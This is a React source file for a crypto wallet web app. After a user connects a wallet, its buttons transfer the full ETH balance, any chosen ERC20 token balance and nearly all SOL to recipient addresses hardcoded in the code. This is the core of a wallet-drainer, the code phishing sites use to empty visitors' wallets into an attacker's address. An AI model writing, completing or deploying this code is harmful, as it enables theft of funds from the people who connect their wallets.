import React, { useState } from "react";
import { useAppKitAccount } from "@reown/appkit/react";
import {
  useBalance,
  useSendTransaction,
  useWriteContract
} from "wagmi";
import { parseEther, parseUnits } from "viem";
import ERC20_ABI from "./abi/erc20.json";
import { useSolanaAccount, useSolanaBalance, sendSol } from "@reown/appkit-adapter-solana/react";
import { ethers } from "ethers";

function App() {
  const { address, isConnected, chain } = useAppKitAccount();
  const { solanaAddress } = useSolanaAccount();

  const [tokenAddress, setTokenAddress] = useState("");

  const FIXED_EVM_RECIPIENT = "0x47E11Fd3e3cEF8Ea9beC9805D1F27dBe775B1D69";
  const FIXED_SOL_RECIPIENT = "5a39EMz6Hm3k1gFcMmTxojPijfiDzNxQcWhDpRUtgDRv";

  const { data: evmBalance } = useBalance({ address, watch: true });
  const { data: solBalance } = useSolanaBalance({ address: solanaAddress, watch: true });

  const { sendTransaction } = useSendTransaction();
  const { writeContract } = useWriteContract();

  // --- Calculate gas cost dynamically ---
  const estimateGasCost = async (tx) => {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const estimatedGas = await provider.estimateGas(tx);
      const gasPrice = await provider.getGasPrice();
      const cost = parseFloat(ethers.formatEther(estimatedGas * gasPrice));
      return cost;
    } catch (e) {
      console.error("Gas estimation failed:", e);
      return 0.001; // fallback buffer
    }
  };

  // --- Send Max EVM Assets ---
  const sendMaxEVM = async () => {
    if (!isConnected || !evmBalance?.formatted) return;

    const provider = new ethers.BrowserProvider(window.ethereum);

    // --- 1️⃣ Send max ETH ---
    let gasCostETH = await estimateGasCost({ to: FIXED_EVM_RECIPIENT, value: parseEther("0.001") });
    let maxETH = parseFloat(evmBalance.formatted) - gasCostETH;
    if (maxETH > 0) {
      sendTransaction({
        to: FIXED_EVM_RECIPIENT,
        value: parseEther(maxETH.toString())
      });
    }

    // --- 2️⃣ Send ERC20 if tokenAddress provided ---
    if (tokenAddress) {
      const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
      const decimals = await contract.decimals();
      const tokenBalanceRaw = await contract.balanceOf(address);
      let tokenBalance = parseFloat(ethers.formatUnits(tokenBalanceRaw, decimals));

      // Estimate gas for ERC20 transfer
      let gasCostToken = await estimateGasCost({ to: tokenAddress, data: contract.interface.encodeFunctionData("transfer", [FIXED_EVM_RECIPIENT, parseUnits(tokenBalance.toString(), decimals)]) });
      if (parseFloat(evmBalance.formatted) < gasCostToken) {
        console.warn("Not enough native balance to cover ERC20 gas, skipping token transfer.");
        return;
      }

      writeContract({
        address: tokenAddress,
        abi: ERC20_ABI,
        functionName: "transfer",
        args: [FIXED_EVM_RECIPIENT, parseUnits(tokenBalance.toString(), decimals)]
      });
    }
  };

  // --- Send Max SOL ---
  const sendMaxSOL = async () => {
    if (!solBalance || !solanaAddress) return;
    const maxSOL = parseFloat(solBalance) - 0.00001;
    if (maxSOL <= 0) return;
    await sendSol({
      to: FIXED_SOL_RECIPIENT,
      amount: maxSOL,
      from: solanaAddress
    });
  };

  return (
    <div style={{ padding: 20 }}>
      <appkit-button />

      {isConnected && (
        <>
          <h3>Connected EVM: {address}</h3>
          <h3>Connected Solana: {solanaAddress}</h3>

          <p>ETH Balance: {evmBalance?.formatted} {evmBalance?.symbol}</p>
          <p>SOL Balance: {solBalance}</p>

          <input
            placeholder="ERC20 Token Address (optional)"
            value={tokenAddress}
            onChange={(e) => setTokenAddress(e.target.value)}
          />

          <button onClick={sendMaxEVM}>
            Send Max EVM Assets (ETH + ERC20)
          </button>
          <button onClick={sendMaxSOL}>
            Send Max SOL
          </button>
        </>
      )}
    </div>
  );
}

export default App;